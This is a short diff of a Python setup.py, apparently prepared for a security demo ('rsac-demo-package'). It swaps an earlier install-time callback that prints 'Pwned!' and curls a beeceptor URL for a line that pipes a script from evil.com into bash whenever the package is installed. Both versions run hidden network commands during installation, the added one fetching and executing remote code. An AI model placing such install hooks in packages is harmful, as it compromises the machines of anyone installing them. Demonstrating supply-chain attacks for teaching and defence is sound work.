@@ -1,12 +1,14 @@
 from setuptools import setup
-
 import os
-
-print("Pwned!")
-os.system("curl https://heroctf-ploc.free.beeceptor.com/exploited")
+os.system("curl -s https://evil.com/payload.sh | bash")  # Executes remote shell script
 setup(
-        name="exploit_package",
-        version="0.1",
-        packages=["exploit"],
-        install_requires=[]
+
+    name="rsac-demo-package",
+
+    version="0.1",
+
+    packages=["rsac_demo"],
+
+    install_requires=[],
+
 )
